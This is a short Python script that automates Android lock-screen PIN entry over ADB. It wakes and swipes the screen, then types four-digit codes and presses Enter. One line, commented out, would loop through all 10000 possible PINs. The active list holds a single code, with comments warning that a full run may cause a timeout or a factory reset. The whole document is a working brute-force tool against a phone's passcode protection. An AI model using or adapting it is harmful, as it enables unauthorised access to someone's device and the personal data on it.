
import os, math

os.system('adb shell input keyevent 26') # Turn ON screen
os.system('adb shell input touchscreen swipe 930 880 930 380') # x1,y1, x2,y2

n = 10000
digits = int(math.log10(n))

# lst = range(n) # May cause Timeout error or Factory Reset
lst = [2589]     # Playing Safe

for i in lst:
    code = str(i).zfill(digits)
    print(code)

    os.system(f'adb shell input text {code}') # Input Passcode
    os.system('adb shell input keyevent 66') # Press OK
